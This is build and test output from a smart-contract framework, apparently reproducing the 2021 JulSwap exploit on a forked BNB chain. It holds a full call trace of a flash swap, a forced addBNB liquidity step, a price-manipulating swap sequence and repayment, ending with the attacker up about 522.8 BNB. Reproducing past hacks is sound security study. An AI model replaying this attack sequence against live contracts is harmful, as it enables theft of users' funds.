Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.37s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20453)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20453] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 269.70ms (129.78µs CPU time)

Ran 1 test for src/test/2021-05/JulSwap_exp.sol:JulSwap
[PASS] testExploit() (gas: 465496)
Logs:
  Attacker BNB Balance Before exploit: 0.000000000000000000
  Attacker BNB Balance After exploit: 522.838342910629238613

Traces:
  [576196] JulSwap::testExploit()
    ├─ [0] VM::deal(JulSwap: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker BNB Balance Before exploit", val: 0, decimals: 18)
    ├─ [550640] 0x0242c5C11E3eaeb53298b45C7395DbaDc8a120E7::swap(70000000000000000000000 [7e22], 0, JulSwap: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x31)
    │   ├─ [36265] 0x32dFFc3fE8E3EF3571bF8a72c0d0015C5373f41D::transfer(JulSwap: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 70000000000000000000000 [7e22])
    │   │   ├─ emit Transfer(from: 0x0242c5C11E3eaeb53298b45C7395DbaDc8a120E7, to: JulSwap: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 70000000000000000000000 [7e22])
    │   │   ├─ [188] JulSwap::onTokenTransfer(0x0242c5C11E3eaeb53298b45C7395DbaDc8a120E7, 70000000000000000000000 [7e22], 0x)
    │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   ├─ emit ContractFallbackCallFailed(: 0x0242c5C11E3eaeb53298b45C7395DbaDc8a120E7, : JulSwap: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 70000000000000000000000 [7e22])
    │   │   └─ ← [Return] true
    │   ├─ [471784] JulSwap::BSCswapCall(JulSwap: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 70000000000000000000000 [7e22], 0, 0x31)
    │   │   ├─ [24476] 0x32dFFc3fE8E3EF3571bF8a72c0d0015C5373f41D::approve(0xbd67d157502A23309Db761c41965600c2Ec788b2, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   │   ├─ emit Approval(owner: JulSwap: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0xbd67d157502A23309Db761c41965600c2Ec788b2, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [105305] 0xbd67d157502A23309Db761c41965600c2Ec788b2::swapExactTokensForBNB(70000000000000000000000 [7e22], 1, [0x32dFFc3fE8E3EF3571bF8a72c0d0015C5373f41D, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], JulSwap: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1622156211 [1.622e9])
    │   │   │   ├─ [2540] 0xCcFE1A5b6e4aD16A4e41A9142673dEc829f39402::getReserves() [staticcall]
    │   │   │   │   └─ ← [Return] 15123221631350493276974 [1.512e22], 1703553267273812456684 [1.703e21], 1622153847 [1.622e9]
    │   │   │   ├─ [9514] 0x32dFFc3fE8E3EF3571bF8a72c0d0015C5373f41D::transferFrom(JulSwap: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xCcFE1A5b6e4aD16A4e41A9142673dEc829f39402, 70000000000000000000000 [7e22])
    │   │   │   │   ├─ emit Transfer(from: JulSwap: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xCcFE1A5b6e4aD16A4e41A9142673dEc829f39402, value: 70000000000000000000000 [7e22])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [65470] 0xCcFE1A5b6e4aD16A4e41A9142673dEc829f39402::swap(0, 1400146882180525770269 [1.4e21], 0xbd67d157502A23309Db761c41965600c2Ec788b2, 0x)
    │   │   │   │   ├─ [29962] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(0xbd67d157502A23309Db761c41965600c2Ec788b2, 1400146882180525770269 [1.4e21])
    │   │   │   │   │   ├─ emit Transfer(from: 0xCcFE1A5b6e4aD16A4e41A9142673dEc829f39402, to: 0xbd67d157502A23309Db761c41965600c2Ec788b2, value: 1400146882180525770269 [1.4e21])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [770] 0x32dFFc3fE8E3EF3571bF8a72c0d0015C5373f41D::balanceOf(0xCcFE1A5b6e4aD16A4e41A9142673dEc829f39402) [staticcall]
    │   │   │   │   │   └─ ← [Return] 85123221631350493276974 [8.512e22]
    │   │   │   │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xCcFE1A5b6e4aD16A4e41A9142673dEc829f39402) [staticcall]
    │   │   │   │   │   └─ ← [Return] 303406385093286686415 [3.034e20]
    │   │   │   │   ├─ emit Sync(reserve0: 85123221631350493276974 [8.512e22], reserve1: 303406385093286686415 [3.034e20])
    │   │   │   │   ├─ emit Swap(sender: 0xbd67d157502A23309Db761c41965600c2Ec788b2, amount0In: 70000000000000000000000 [7e22], amount1In: 0, amount0Out: 0, amount1Out: 1400146882180525770269 [1.4e21], to: 0xbd67d157502A23309Db761c41965600c2Ec788b2)
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [9235] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::withdraw(1400146882180525770269 [1.4e21])
    │   │   │   │   ├─ [95] 0xbd67d157502A23309Db761c41965600c2Ec788b2::fallback{value: 1400146882180525770269}()
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   ├─ emit Withdrawal(src: 0xbd67d157502A23309Db761c41965600c2Ec788b2, wad: 1400146882180525770269 [1.4e21])
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [55] JulSwap::receive{value: 1400146882180525770269}()
    │   │   │   │   └─ ← [Stop] 
    │   │   │   └─ ← [Return] [70000000000000000000000 [7e22], 1400146882180525770269 [1.4e21]]
    │   │   ├─ [212346] 0x41a2F9AB325577f92e8653853c12823b35fb35c4::addBNB{value: 515000000000000000000}()
    │   │   │   ├─ [540] 0xCcFE1A5b6e4aD16A4e41A9142673dEc829f39402::getReserves() [staticcall]
    │   │   │   │   └─ ← [Return] 85123221631350493276974 [8.512e22], 303406385093286686415 [3.034e20], 1622155008 [1.622e9]
    │   │   │   ├─ [2770] 0x32dFFc3fE8E3EF3571bF8a72c0d0015C5373f41D::balanceOf(0x41a2F9AB325577f92e8653853c12823b35fb35c4) [staticcall]
    │   │   │   │   └─ ← [Return] 148525223539050531686881 [1.485e23]
    │   │   │   ├─ [24476] 0x32dFFc3fE8E3EF3571bF8a72c0d0015C5373f41D::approve(0xbd67d157502A23309Db761c41965600c2Ec788b2, 144487595825205639607875 [1.444e23])
    │   │   │   │   ├─ emit Approval(owner: 0x41a2F9AB325577f92e8653853c12823b35fb35c4, spender: 0xbd67d157502A23309Db761c41965600c2Ec788b2, value: 144487595825205639607875 [1.444e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [116854] 0xbd67d157502A23309Db761c41965600c2Ec788b2::addLiquidityBNB{value: 515000000000000000000}(0x32dFFc3fE8E3EF3571bF8a72c0d0015C5373f41D, 144487595825205639607875 [1.444e23], 144487595825205639607875 [1.444e23], 1, 0x41a2F9AB325577f92e8653853c12823b35fb35c4, 1622155008 [1.622e9])
    │   │   │   │   ├─ [2600] 0x553990F2CBA90272390f62C5BDb1681fFc899675::getPair(0x32dFFc3fE8E3EF3571bF8a72c0d0015C5373f41D, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0xCcFE1A5b6e4aD16A4e41A9142673dEc829f39402
    │   │   │   │   ├─ [540] 0xCcFE1A5b6e4aD16A4e41A9142673dEc829f39402::getReserves() [staticcall]
    │   │   │   │   │   └─ ← [Return] 85123221631350493276974 [8.512e22], 303406385093286686415 [3.034e20], 1622155008 [1.622e9]
    │   │   │   │   ├─ [7514] 0x32dFFc3fE8E3EF3571bF8a72c0d0015C5373f41D::transferFrom(0x41a2F9AB325577f92e8653853c12823b35fb35c4, 0xCcFE1A5b6e4aD16A4e41A9142673dEc829f39402, 144487595825205639607875 [1.444e23])
    │   │   │   │   │   ├─ emit Transfer(from: 0x41a2F9AB325577f92e8653853c12823b35fb35c4, to: 0xCcFE1A5b6e4aD16A4e41A9142673dEc829f39402, value: 144487595825205639607875 [1.444e23])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [21974] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::deposit{value: 514999999999999999999}()
    │   │   │   │   │   ├─ emit Deposit(dst: 0xbd67d157502A23309Db761c41965600c2Ec788b2, wad: 514999999999999999999 [5.149e20])
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   ├─ [3262] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(0xCcFE1A5b6e4aD16A4e41A9142673dEc829f39402, 514999999999999999999 [5.149e20])
    │   │   │   │   │   ├─ emit Transfer(from: 0xbd67d157502A23309Db761c41965600c2Ec788b2, to: 0xCcFE1A5b6e4aD16A4e41A9142673dEc829f39402, value: 514999999999999999999 [5.149e20])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [58389] 0xCcFE1A5b6e4aD16A4e41A9142673dEc829f39402::mint(0x41a2F9AB325577f92e8653853c12823b35fb35c4)
    │   │   │   │   │   ├─ [770] 0x32dFFc3fE8E3EF3571bF8a72c0d0015C5373f41D::balanceOf(0xCcFE1A5b6e4aD16A4e41A9142673dEc829f39402) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 229610817456556132884849 [2.296e23]
    │   │   │   │   │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xCcFE1A5b6e4aD16A4e41A9142673dEc829f39402) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 818406385093286686414 [8.184e20]
    │   │   │   │   │   ├─ [2361] 0x553990F2CBA90272390f62C5BDb1681fFc899675::feeTo() [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0xc34292EFd65924430CEA9658eaa73208c4265154
    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0xc34292EFd65924430CEA9658eaa73208c4265154, value: 864810995936671181 [8.648e17])
    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x41a2F9AB325577f92e8653853c12823b35fb35c4, value: 6781768441209196495678 [6.781e21])
    │   │   │   │   │   ├─ emit Sync(reserve0: 229610817456556132884849 [2.296e23], reserve1: 818406385093286686414 [8.184e20])
    │   │   │   │   │   ├─ emit Mint(sender: 0xbd67d157502A23309Db761c41965600c2Ec788b2, amount0: 144487595825205639607875 [1.444e23], amount1: 514999999999999999999 [5.149e20])
    │   │   │   │   │   └─ ← [Return] 6781768441209196495678 [6.781e21]
    │   │   │   │   ├─ [55] 0x41a2F9AB325577f92e8653853c12823b35fb35c4::fallback{value: 1}()
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000001e98b0321aeecb9b764300000000000000000000000000000000000000000000001beb0f8b69be2bffff00000000000000000000000000000000000000000000016fa3f181ee3cc1c33e
    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000001e98b0321aeecb9b764300000000000000000000000000000000000000000000001beb0f8b69be2bffff00000000000000000000000000000000000000000000016fa3f181ee3cc1c33e
    │   │   ├─ [89034] 0xbd67d157502A23309Db761c41965600c2Ec788b2::swapBNBForExactTokens{value: 885146882180525770269}(70310631895687061183551 [7.031e22], [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0x32dFFc3fE8E3EF3571bF8a72c0d0015C5373f41D], JulSwap: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1622156211 [1.622e9])
    │   │   │   ├─ [540] 0xCcFE1A5b6e4aD16A4e41A9142673dEc829f39402::getReserves() [staticcall]
    │   │   │   │   └─ ← [Return] 229610817456556132884849 [2.296e23], 818406385093286686414 [8.184e20], 1622155008 [1.622e9]
    │   │   │   ├─ [21974] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::deposit{value: 362308539269896531656}()
    │   │   │   │   ├─ emit Deposit(dst: 0xbd67d157502A23309Db761c41965600c2Ec788b2, wad: 362308539269896531656 [3.623e20])
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [3262] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(0xCcFE1A5b6e4aD16A4e41A9142673dEc829f39402, 362308539269896531656 [3.623e20])
    │   │   │   │   ├─ emit Transfer(from: 0xbd67d157502A23309Db761c41965600c2Ec788b2, to: 0xCcFE1A5b6e4aD16A4e41A9142673dEc829f39402, value: 362308539269896531656 [3.623e20])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [41113] 0xCcFE1A5b6e4aD16A4e41A9142673dEc829f39402::swap(70310631895687061183551 [7.031e22], 0, JulSwap: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   │   │   ├─ [27465] 0x32dFFc3fE8E3EF3571bF8a72c0d0015C5373f41D::transfer(JulSwap: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 70310631895687061183551 [7.031e22])
    │   │   │   │   │   ├─ emit Transfer(from: 0xCcFE1A5b6e4aD16A4e41A9142673dEc829f39402, to: JulSwap: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 70310631895687061183551 [7.031e22])
    │   │   │   │   │   ├─ [188] JulSwap::onTokenTransfer(0xCcFE1A5b6e4aD16A4e41A9142673dEc829f39402, 70310631895687061183551 [7.031e22], 0x)
    │   │   │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   │   │   ├─ emit ContractFallbackCallFailed(: 0xCcFE1A5b6e4aD16A4e41A9142673dEc829f39402, : JulSwap: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 70310631895687061183551 [7.031e22])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [770] 0x32dFFc3fE8E3EF3571bF8a72c0d0015C5373f41D::balanceOf(0xCcFE1A5b6e4aD16A4e41A9142673dEc829f39402) [staticcall]
    │   │   │   │   │   └─ ← [Return] 159300185560869071701298 [1.593e23]
    │   │   │   │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xCcFE1A5b6e4aD16A4e41A9142673dEc829f39402) [staticcall]
    │   │   │   │   │   └─ ← [Return] 1180714924363183218070 [1.18e21]
    │   │   │   │   ├─ emit Sync(reserve0: 159300185560869071701298 [1.593e23], reserve1: 1180714924363183218070 [1.18e21])
    │   │   │   │   ├─ emit Swap(sender: 0xbd67d157502A23309Db761c41965600c2Ec788b2, amount0In: 0, amount1In: 362308539269896531656 [3.623e20], amount0Out: 70310631895687061183551 [7.031e22], amount1Out: 0, to: JulSwap: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [55] JulSwap::receive{value: 522838342910629238613}()
    │   │   │   │   └─ ← [Stop] 
    │   │   │   └─ ← [Return] [362308539269896531656 [3.623e20], 70310631895687061183551 [7.031e22]]
    │   │   ├─ [7625] 0x32dFFc3fE8E3EF3571bF8a72c0d0015C5373f41D::transfer(0x0242c5C11E3eaeb53298b45C7395DbaDc8a120E7, 70210631895687061183551 [7.021e22])
    │   │   │   ├─ emit Transfer(from: JulSwap: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0242c5C11E3eaeb53298b45C7395DbaDc8a120E7, value: 70210631895687061183551 [7.021e22])
    │   │   │   ├─ [248] 0x0242c5C11E3eaeb53298b45C7395DbaDc8a120E7::onTokenTransfer(JulSwap: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 70210631895687061183551 [7.021e22], 0x)
    │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   ├─ emit ContractFallbackCallFailed(: JulSwap: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 0x0242c5C11E3eaeb53298b45C7395DbaDc8a120E7, : 70210631895687061183551 [7.021e22])
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Stop] 
    │   ├─ [770] 0x32dFFc3fE8E3EF3571bF8a72c0d0015C5373f41D::balanceOf(0x0242c5C11E3eaeb53298b45C7395DbaDc8a120E7) [staticcall]
    │   │   └─ ← [Return] 75378285468006526851322 [7.537e22]
    │   ├─ [2556] 0x5A41F637C3f7553dBa6dDC2D3cA92641096577ea::balanceOf(0x0242c5C11E3eaeb53298b45C7395DbaDc8a120E7) [staticcall]
    │   │   └─ ← [Return] 50528469102950372016213889 [5.052e25]
    │   ├─ emit Sync(reserve0: 75378285468006526851322 [7.537e22], reserve1: 50528469102950372016213889 [5.052e25])
    │   ├─ emit Swap(sender: JulSwap: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 70210631895687061183551 [7.021e22], amount1In: 0, amount0Out: 70000000000000000000000 [7e22], amount1Out: 0, to: JulSwap: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   └─ ← [Stop] 
    ├─ emit log_named_decimal_uint(key: "Attacker BNB Balance After exploit", val: 522838342910629238613 [5.228e20], decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 341.16ms (2.54ms CPU time)

Ran 2 test suites in 343.37ms (610.86ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
